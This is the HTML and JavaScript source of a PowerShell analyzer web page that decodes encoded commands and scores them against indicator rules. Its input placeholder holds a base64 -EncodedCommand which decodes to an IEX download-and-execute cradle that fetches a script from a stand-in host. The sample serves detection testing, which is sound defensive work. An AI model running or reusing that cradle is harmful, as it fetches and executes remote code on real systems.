<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Shell We Dance — PowerShell analyzer</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0d0f14;
      --surface: #161a22;
      --surface2: #1e232e;
      --border: #2d3340;
      --text: #e6edf3;
      --text-muted: #8b949e;
      --accent: #7ee787;
      --accent-dim: #3fb950;
      --danger: #f85149;
      --warn: #d29922;
      --radius: 12px;
      --shadow: 0 8px 32px rgba(0,0,0,0.4);
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: 'Outfit', system-ui, sans-serif;
      background: var(--bg);
      color: var(--text);
      line-height: 1.5;
    }
    .container {
      max-width: 900px;
      margin: 0 auto;
      padding: 2rem 1.5rem;
      overflow-x: hidden;
    }
    header {
      text-align: center;
      margin-bottom: 2.5rem;
    }
    header .logo {
      display: block;
      width: 120px;
      height: auto;
      margin: 0 auto 1rem;
    }
    h1 {
      font-size: 1.75rem;
      font-weight: 700;
      letter-spacing: -0.02em;
      margin: 0 0 0.25rem 0;
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-dim) 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .sub {
      font-size: 0.95rem;
      color: var(--text-muted);
      margin: 0;
    }
    .card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 1.5rem;
      margin-bottom: 1.5rem;
      box-shadow: var(--shadow);
      min-width: 0;
      overflow-x: hidden;
    }
    label {
      display: block;
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--text-muted);
      margin-bottom: 0.5rem;
    }
    textarea {
      width: 100%;
      min-height: 140px;
      padding: 1rem;
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.9rem;
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text);
      resize: vertical;
      transition: border-color 0.2s;
      overflow-wrap: break-word;
      word-break: break-all;
    }
    textarea:focus {
      outline: none;
      border-color: var(--accent-dim);
    }
    textarea::placeholder {
      color: var(--text-muted);
      opacity: 0.8;
    }
    .actions {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-top: 1rem;
      flex-wrap: wrap;
    }
    button {
      font-family: 'Outfit', sans-serif;
      font-size: 0.95rem;
      font-weight: 600;
      padding: 0.75rem 1.5rem;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: transform 0.05s, box-shadow 0.2s;
    }
    button:active { transform: scale(0.98); }
    .btn-primary {
      background: linear-gradient(135deg, var(--accent-dim) 0%, #2ea043 100%);
      color: var(--bg);
    }
    .btn-primary:hover {
      box-shadow: 0 4px 20px rgba(62, 185, 80, 0.35);
    }
    .btn-primary:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .status {
      font-size: 0.9rem;
      color: var(--text-muted);
    }
    .status.loading { color: var(--warn); }
    .status.error { color: var(--danger); }
    .status.ok { color: var(--accent); }
    #results { display: none; }
    #results.visible { display: block; }
    .score-row {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-bottom: 1rem;
      flex-wrap: wrap;
    }
    .score-badge {
      font-size: 1.25rem;
      font-weight: 700;
      padding: 0.5rem 1rem;
      border-radius: 8px;
    }
    .score-badge.suspicious {
      background: rgba(248, 81, 73, 0.2);
      color: var(--danger);
    }
    .score-badge.clean {
      background: rgba(62, 185, 80, 0.2);
      color: var(--accent);
    }
    .indicators-summary-inline {
      display: flex;
      flex-wrap: wrap;
      gap: 1rem;
      margin-top: 1rem;
      padding: 0.75rem 1rem;
      background: var(--surface2);
      border-radius: 8px;
      border: 1px solid var(--border);
      font-size: 0.9rem;
    }
    .indicators-summary-inline .summary-item {
      display: flex;
      align-items: baseline;
      gap: 0.35rem;
    }
    .indicators-summary-inline .summary-label {
      color: var(--text-muted);
    }
    .indicators-summary-inline .summary-value {
      font-weight: 600;
      color: var(--text);
    }
    .indicators-summary-inline .severity-badge {
      font-size: 0.85rem;
      font-weight: 600;
      padding: 0.25rem 0.6rem;
      border-radius: 6px;
    }
    .indicators-summary-inline .severity-badge.severity-clean {
      background: rgba(62, 185, 80, 0.2);
      color: #3fb950;
    }
    .indicators-summary-inline .severity-badge.severity-low {
      background: rgba(121, 192, 255, 0.25);
      color: #79c0ff;
    }
    .indicators-summary-inline .severity-badge.severity-medium {
      background: rgba(210, 153, 34, 0.25);
      color: #d29922;
    }
    .indicators-summary-inline .severity-badge.severity-high {
      background: rgba(248, 81, 73, 0.2);
      color: #f85149;
    }
    .indicators-summary-inline .severity-badge.severity-critical {
      background: rgba(163, 48, 58, 0.3);
      color: #ff7b72;
    }
    .decoded-box {
      margin-top: 1rem;
      padding: 1rem;
      background: var(--surface2);
      border-radius: 8px;
      border-left: 4px solid var(--accent-dim);
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.85rem;
      white-space: pre-wrap;
      word-break: break-all;
      overflow-wrap: break-word;
      max-width: 100%;
      overflow-x: hidden;
    }
    .decoded-box.empty { display: none; }
    .section-title {
      font-size: 0.8rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.06em;
      color: var(--text-muted);
      margin: 1.25rem 0 0.5rem 0;
    }
    .match-list {
      list-style: none;
      padding: 0;
      margin: 0;
    }
    .match-item {
      padding: 0.6rem 0.75rem;
      background: var(--surface2);
      border-radius: 6px;
      margin-bottom: 0.5rem;
      font-size: 0.9rem;
      border-left: 3px solid var(--warn);
      min-width: 0;
      overflow-wrap: break-word;
      word-break: break-all;
    }
    .match-item .name { font-weight: 600; color: var(--text); }
    .match-item .meta { font-size: 0.8rem; color: var(--text-muted); margin-top: 0.2rem; }
    .match-item .snippet { font-family: 'JetBrains Mono', font-size: 0.8rem; color: var(--accent); margin-top: 0.25rem; word-break: break-all; overflow-wrap: break-word; }
    .empty-matches { color: var(--text-muted); font-size: 0.9rem; }
    .indicators-table-wrap { overflow-x: auto; margin-top: 0.5rem; }
    .indicators-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    .indicators-table th,
    .indicators-table td {
      padding: 0.5rem 0.75rem;
      text-align: left;
      border-bottom: 1px solid var(--border);
    }
    .indicators-table th {
      color: var(--text-muted);
      font-weight: 600;
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 0.04em;
    }
    .indicators-table tbody tr:hover {
      background: var(--surface2);
    }
    .indicators-table .severity-cell {
      font-weight: 600;
      padding: 0.2rem 0.5rem;
      border-radius: 4px;
      display: inline-block;
      font-size: 0.8rem;
    }
    .indicators-table .severity-cell.severity-clean { background: rgba(62, 185, 80, 0.2); color: #3fb950; }
    .indicators-table .severity-cell.severity-low { background: rgba(121, 192, 255, 0.25); color: #79c0ff; }
    .indicators-table .severity-cell.severity-medium { background: rgba(210, 153, 34, 0.25); color: #d29922; }
    .indicators-table .severity-cell.severity-high { background: rgba(248, 81, 73, 0.2); color: #f85149; }
    .indicators-table .severity-cell.severity-critical { background: rgba(163, 48, 58, 0.3); color: #ff7b72; }
    .indicators-table .tactics-techniques { color: var(--text-muted); font-size: 0.8rem; }
    footer {
      text-align: center;
      margin-top: 2rem;
      font-size: 0.85rem;
      color: var(--text-muted);
    }
    footer a { color: var(--accent-dim); text-decoration: none; }
    footer a:hover { text-decoration: underline; }
    .indicators-summary {
      margin-top: 1.5rem;
    }
    .indicators-toggle {
      font-family: 'Outfit', sans-serif;
      font-size: 0.9rem;
      font-weight: 600;
      padding: 0.5rem 1rem;
      background: var(--surface2);
      border: 1px solid var(--border);
      border-radius: 8px;
      color: var(--text-muted);
      cursor: pointer;
      transition: color 0.2s, border-color 0.2s;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .indicators-toggle:hover {
      color: var(--text);
      border-color: var(--text-muted);
    }
    .indicators-toggle .chevron {
      transition: transform 0.2s;
    }
    .indicators-summary.expanded .indicators-toggle .chevron {
      transform: rotate(180deg);
    }
    .indicators-list-wrap {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.25s ease-out;
    }
    .indicators-summary.expanded .indicators-list-wrap {
      max-height: 320px;
      transition: max-height 0.25s ease-in;
    }
    .indicators-list {
      margin-top: 0.75rem;
      padding: 0;
      max-height: 400px;
      overflow-y: auto;
      list-style: none;
    }
    .indicator-detail {
      padding: 0.75rem 1rem;
      margin-bottom: 0.5rem;
      background: var(--surface2);
      border-radius: 8px;
      border: 1px solid var(--border);
      font-size: 0.85rem;
    }
    .indicator-detail .indicator-name {
      font-weight: 600;
      color: var(--text);
      margin-bottom: 0.25rem;
    }
    .indicator-detail .indicator-desc {
      color: var(--text-muted);
      font-size: 0.8rem;
      margin-bottom: 0.35rem;
      line-height: 1.4;
    }
    .indicator-detail .indicator-regex {
      font-family: 'JetBrains Mono', monospace;
      font-size: 0.75rem;
      color: var(--accent);
      word-break: break-all;
      overflow-wrap: break-word;
      margin-bottom: 0.35rem;
    }
    .indicator-detail .indicator-meta {
      font-size: 0.75rem;
      color: var(--text-muted);
    }
    footer {
      text-align: center;
      margin-top: 2rem;
      font-size: 0.85rem;
      color: var(--text-muted);
    }
    footer a { color: var(--accent-dim); text-decoration: none; }
    footer a:hover { text-decoration: underline; }
    .indicators-fetch-status {
      font-size: 0.85rem;
      margin-top: 0.5rem;
      padding: 0.4rem 0.6rem;
      border-radius: 6px;
      display: inline-block;
    }
    .indicators-fetch-status.loading { color: var(--warn); background: rgba(210, 153, 34, 0.15); }
    .indicators-fetch-status.ok { color: var(--accent); background: rgba(62, 185, 80, 0.15); }
    .indicators-fetch-status.fail { color: var(--danger); background: rgba(248, 81, 73, 0.15); }
    .indicators-load-errors { margin-top: 0.5rem; padding: 0.5rem 0.75rem; font-size: 0.875rem; color: var(--danger); background: rgba(248, 81, 73, 0.08); border-radius: 6px; }
    .indicators-load-errors ul { margin: 0; padding-left: 1.25rem; }
    .indicators-load-errors li { margin: 0.25rem 0; }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <img src="shellwedance.png" alt="Shell We Dance" class="logo" width="120">
      <h1>Shell We Dance</h1>
      <p class="sub">PowerShell command-line analyzer — indicators &amp; -EncodedCommand decoding</p>
    </header>

    <div class="card">
      <label for="command">PowerShell command line</label>
      <textarea id="command" placeholder="Paste a command, e.g.&#10;powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" autofocus></textarea>
      <div class="actions">
        <button id="analyze" class="btn-primary">Analyze</button>
        <span id="status" class="status"></span>
      </div>
      <div id="indicatorsFetchStatus" class="indicators-fetch-status" style="display: none;" aria-live="polite"></div>
      <div id="indicatorsLoadErrors" class="indicators-load-errors" style="display: none;" aria-live="polite"></div>
    </div>

    <div id="results" class="card">
      <div class="score-row">
        <span id="scoreBadge" class="score-badge"></span>
        <span id="scoreLabel"></span>
      </div>
      <div id="indicatorsSummaryInline" class="indicators-summary-inline" style="display: none;">
        <span class="summary-item"><span class="summary-label">Total indicators:</span><span id="summaryTotal" class="summary-value">—</span></span>
        <span class="summary-item"><span class="summary-label">Matched:</span><span id="summaryMatched" class="summary-value">—</span></span>
        <span class="summary-item"><span class="summary-label">Total score:</span><span id="summaryScore" class="summary-value">—</span></span>
        <span class="summary-item"><span class="summary-label">Severity:</span><span id="summarySeverity" class="severity-badge">—</span></span>
      </div>
      <div id="decodedSection" class="decoded-box empty"></div>
      <div class="section-title">Indicator matches</div>
      <div id="indicatorsTableWrap" class="indicators-table-wrap" style="display: none;">
        <table class="indicators-table" aria-label="Indicator matches">
          <thead>
            <tr>
              <th>Source</th>
              <th>Indicator Name</th>
              <th>Severity</th>
              <th>Score</th>
              <th>Tactics</th>
              <th>Techniques</th>
              <th>Matched</th>
            </tr>
          </thead>
          <tbody id="matchTableBody"></tbody>
        </table>
      </div>
      <ul id="matchList" class="match-list"></ul>
      <p id="emptyMatches" class="empty-matches" style="display:none;">No indicator matches.</p>
    </div>

    <div id="indicatorsSummary" class="card indicators-summary">
      <button type="button" id="indicatorsToggle" class="indicators-toggle" aria-expanded="false">
        <span class="chevron">▼</span>
        <span id="indicatorsToggleLabel">Show indicators (0)</span>
      </button>
      <div class="indicators-list-wrap">
        <ul id="indicatorsList" class="indicators-list"></ul>
      </div>
    </div>

    <footer>
      <a href="https://github.com/avasero/psexposed/tree/main/indicators" target="_blank" rel="noopener">Indicators from psexposed</a>
      ·
      <a href="https://github.com/ping2A/ShellWeDance" target="_blank" rel="noopener">ShellWeDance</a>
    </footer>
  </div>

  <script type="module">
    const DEBUG = true;
    const log = (...args) => { if (DEBUG) console.log('[ShellWeDance]', ...args); };
    const warn = (...args) => { console.warn('[ShellWeDance]', ...args); };
    const error = (...args) => { console.error('[ShellWeDance]', ...args); };

    const INDICATORS_BASE = new URL('indicators/', document.baseURI || window.location.href).href;
    const MANIFEST_URL = new URL('indicators/manifest.json', document.baseURI || window.location.href).href;

    const commandEl = document.getElementById('command');
    const analyzeBtn = document.getElementById('analyze');
    const statusEl = document.getElementById('status');
    const resultsEl = document.getElementById('results');
    const scoreBadgeEl = document.getElementById('scoreBadge');
    const scoreLabelEl = document.getElementById('scoreLabel');
    const decodedSectionEl = document.getElementById('decodedSection');
    const matchListEl = document.getElementById('matchList');
    const emptyMatchesEl = document.getElementById('emptyMatches');
    const indicatorsSummaryEl = document.getElementById('indicatorsSummary');
    const indicatorsToggleEl = document.getElementById('indicatorsToggle');
    const indicatorsToggleLabelEl = document.getElementById('indicatorsToggleLabel');
    const indicatorsListEl = document.getElementById('indicatorsList');
    const indicatorsFetchStatusEl = document.getElementById('indicatorsFetchStatus');
    const indicatorsLoadErrorsEl = document.getElementById('indicatorsLoadErrors');
    const indicatorsSummaryInlineEl = document.getElementById('indicatorsSummaryInline');
    const summaryTotalEl = document.getElementById('summaryTotal');
    const summaryMatchedEl = document.getElementById('summaryMatched');
    const summaryScoreEl = document.getElementById('summaryScore');
    const summarySeverityEl = document.getElementById('summarySeverity');
    const indicatorsTableWrapEl = document.getElementById('indicatorsTableWrap');
    const matchTableBodyEl = document.getElementById('matchTableBody');

    function severityFromScore(score) {
      if (score <= 0) return { label: 'Clean', class: 'severity-clean' };
      if (score < 5) return { label: 'Low', class: 'severity-low' };
      if (score < 8) return { label: 'Medium', class: 'severity-medium' };
      if (score < 10) return { label: 'High', class: 'severity-high' };
      return { label: 'Critical', class: 'severity-critical' };
    }

    let app = null;

    function setIndicatorsFetchStatus(state, text) {
      indicatorsFetchStatusEl.style.display = 'inline-block';
      indicatorsFetchStatusEl.className = 'indicators-fetch-status ' + state;
      indicatorsFetchStatusEl.textContent = text;
    }

    function updateIndicatorsSummary() {
      if (!app) return;
      const n = app.indicator_count();
      log('updateIndicatorsSummary: count =', n);
      indicatorsToggleLabelEl.textContent = indicatorsSummaryEl.classList.contains('expanded') ? `Hide indicators (${n})` : `Show indicators (${n})`;
      try {
        const infos = JSON.parse(app.indicator_infos_json());
        indicatorsListEl.innerHTML = infos.map(ind => {
          const desc = ind.description ? `<div class="indicator-desc">${escapeHtml(ind.description)}</div>` : '';
          const regex = ind.regex ? `<div class="indicator-regex">${escapeHtml(ind.regex)}</div>` : '';
          const meta = [ind.tactic, ...(ind.technique || [])].filter(Boolean);
          const metaStr = meta.length ? `score ${ind.basescore} · ${meta.join(' · ')}` : `score ${ind.basescore}`;
          return `<li class="indicator-detail"><div class="indicator-name">${escapeHtml(ind.name)}</div>${desc}${regex}<div class="indicator-meta">${escapeHtml(metaStr)}</div></li>`;
        }).join('');
      } catch (e) {
        warn('updateIndicatorsSummary: parse failed', e);
        indicatorsListEl.innerHTML = '';
      }
    }

    indicatorsToggleEl.addEventListener('click', () => {
      indicatorsSummaryEl.classList.toggle('expanded');
      indicatorsToggleEl.setAttribute('aria-expanded', indicatorsSummaryEl.classList.contains('expanded'));
      updateIndicatorsSummary();
    });

    async function init() {
      log('init: starting');
      statusEl.textContent = 'Loading…';
      statusEl.className = 'status loading';
      setIndicatorsFetchStatus('loading', 'Indicators: loading…');
      try {
        log('init: loading WASM module');
        const { default: initWasm, ShellWeDanceApp } = await import('./pkg/shell_we_dance_wasm.js');
        await initWasm();
        log('init: WASM loaded');
        app = new ShellWeDanceApp();
        log('init: request manifest', { url: MANIFEST_URL });
        const manifestResp = await fetch(MANIFEST_URL, { method: 'GET' });
        if (!manifestResp.ok) {
          log('init: manifest fetch failed', { status: manifestResp.status, url: manifestResp.url });
          setIndicatorsFetchStatus('fail', `Indicators: manifest failed — ${manifestResp.status}`);
          throw new Error(`manifest ${manifestResp.status} ${manifestResp.statusText}`);
        }
        const filenames = await manifestResp.json();
        if (!Array.isArray(filenames) || filenames.length === 0) {
          setIndicatorsFetchStatus('fail', 'Indicators: empty manifest');
          throw new Error('Empty or invalid manifest');
        }
        log('init: manifest ok', { count: filenames.length });
        const total = filenames.length;
        const yamlTexts = [];
        for (let i = 0; i < filenames.length; i++) {
          const name = filenames[i];
          const fileUrl = new URL(name, INDICATORS_BASE).href;
          setIndicatorsFetchStatus('loading', `Indicators: loading (${i + 1}/${total})…`);
          log('init: fetch rule', { i: i + 1, total, name });
          const resp = await fetch(fileUrl, { method: 'GET' });
          if (!resp.ok) {
            log('init: rule fetch failed', { name, status: resp.status });
            setIndicatorsFetchStatus('fail', `Indicators: failed — ${name} ${resp.status}`);
            throw new Error(`${name} ${resp.status}`);
          }
          const text = await resp.text();
          yamlTexts.push(text);
        }
        setIndicatorsFetchStatus('loading', 'Indicators: parsing…');
        try {
          app.load_indicators_batch(JSON.stringify(yamlTexts));
        } catch (loadErr) {
          error('init: load_indicators_batch failed', loadErr);
          setIndicatorsFetchStatus('fail', 'Indicators: parse error — ' + (loadErr.message || String(loadErr)));
          throw loadErr;
        }
        const n = app.indicator_count();
        const loadErrors = JSON.parse(app.get_load_errors_json());
        if (loadErrors.length > 0) {
          warn('init: some rules failed to load', { count: loadErrors.length, errors: loadErrors });
          setIndicatorsFetchStatus('ok', `Indicators: loaded (${n}), ${loadErrors.length} failed`);
          indicatorsLoadErrorsEl.style.display = 'block';
          indicatorsLoadErrorsEl.innerHTML = '<strong>Rules that failed to load:</strong><ul>' +
            loadErrors.map(e => {
              const name = filenames[e.index] ?? `#${e.index}`;
              const msg = escapeHtml(e.message ?? '');
              return `<li><code>${escapeHtml(name)}</code> — ${msg}</li>`;
            }).join('') +
            '</ul>';
        } else {
          log('init: indicators loaded', { count: n, loadErrors: 0 });
          setIndicatorsFetchStatus('ok', `Indicators: loaded (${n})`);
          indicatorsLoadErrorsEl.style.display = 'none';
          indicatorsLoadErrorsEl.innerHTML = '';
        }
        statusEl.textContent = `Ready (${n} indicators)`;
        statusEl.className = 'status ok';
        analyzeBtn.disabled = false;
        updateIndicatorsSummary();
        log('init: done');
      } catch (e) {
        error('init failed:', e);
        const statusText = indicatorsFetchStatusEl.textContent;
        if (statusText.startsWith('Indicators: ') && (statusText.includes('fetching') || statusText.includes('loading') || statusText.includes('parsing'))) {
          setIndicatorsFetchStatus('fail', 'Indicators: failed — ' + (e.message || String(e)));
        }
        statusEl.textContent = 'Failed: ' + e.message;
        statusEl.className = 'status error';
      }
    }

    function render(result) {
      const suspicious = result.is_suspicious;
      scoreBadgeEl.textContent = suspicious ? `Score: ${result.total_score.toFixed(1)}` : 'Clean';
      scoreBadgeEl.className = 'score-badge ' + (suspicious ? 'suspicious' : 'clean');
      scoreLabelEl.textContent = suspicious ? 'Suspicious activity detected' : 'No indicators matched';

      // Indicators Summary (like powershell.exposed) with severity and colors
      const totalIndicators = app ? app.indicator_count() : 0;
      const matchedCount = result.matches ? result.matches.length : 0;
      const score = result.total_score ?? 0;
      indicatorsSummaryInlineEl.style.display = 'flex';
      summaryTotalEl.textContent = totalIndicators;
      summaryMatchedEl.textContent = matchedCount;
      summaryScoreEl.textContent = score.toFixed(1);
      const sev = severityFromScore(score);
      summarySeverityEl.textContent = sev.label;
      summarySeverityEl.className = 'severity-badge ' + sev.class;

      if (result.decoded_content && result.decoded_content.length > 0) {
        decodedSectionEl.textContent = result.decoded_content;
        decodedSectionEl.className = 'decoded-box';
      } else {
        decodedSectionEl.className = 'decoded-box empty';
      }

      // Table: Source, Indicator Name, Severity, Score, Tactics, Techniques
      matchTableBodyEl.innerHTML = '';
      if (result.matches && result.matches.length > 0) {
        indicatorsTableWrapEl.style.display = 'block';
        emptyMatchesEl.style.display = 'none';
        result.matches.forEach(m => {
          const sev = severityFromScore(m.basescore ?? 0);
          const source = m.matched_against || 'command_line';
          const tactics = m.tactic || '';
          const techniques = (m.technique || []).join(', ');
          const snippet = (m.matched_substring || '').length > 80 ? (m.matched_substring || '').slice(0, 77) + '...' : (m.matched_substring || '—');
          const tr = document.createElement('tr');
          tr.innerHTML = `
            <td>${escapeHtml(source)}</td>
            <td>${escapeHtml(m.indicator_name)}</td>
            <td><span class="severity-cell ${sev.class}">${escapeHtml(sev.label)}</span></td>
            <td>${Number(m.basescore).toFixed(1)}</td>
            <td class="tactics-techniques">${escapeHtml(tactics)}</td>
            <td class="tactics-techniques">${escapeHtml(techniques)}</td>
            <td class="tactics-techniques" style="max-width:200px;word-break:break-all;">${escapeHtml(snippet)}</td>
          `;
          matchTableBodyEl.appendChild(tr);
        });
      } else {
        indicatorsTableWrapEl.style.display = 'none';
        emptyMatchesEl.style.display = 'block';
      }
      matchListEl.style.display = result.matches && result.matches.length > 0 ? 'none' : 'block';
      matchListEl.innerHTML = '';

      resultsEl.classList.add('visible');
    }

    function escapeHtml(s) {
      const div = document.createElement('div');
      div.textContent = s;
      return div.innerHTML;
    }

    analyzeBtn.addEventListener('click', () => {
      if (!app) {
        warn('analyze: app not ready');
        return;
      }
      const cmd = commandEl.value.trim();
      if (!cmd) {
        statusEl.textContent = 'Enter a command.';
        statusEl.className = 'status error';
        warn('analyze: empty command');
        return;
      }
      log('analyze: command length =', cmd.length);
      statusEl.textContent = 'Analyzing…';
      statusEl.className = 'status loading';
      try {
        const json = app.analyze(cmd);
        const result = JSON.parse(json);
        log('analyze: result is_suspicious =', result.is_suspicious, 'total_score =', result.total_score, 'matches =', result.matches?.length ?? 0);
        render(result);
        statusEl.textContent = 'Done';
        statusEl.className = 'status ok';
      } catch (e) {
        error('analyze failed:', e);
        statusEl.textContent = 'Error: ' + e.message;
        statusEl.className = 'status error';
      }
    });

    analyzeBtn.disabled = true;
    init();
  </script>
</body>
</html>
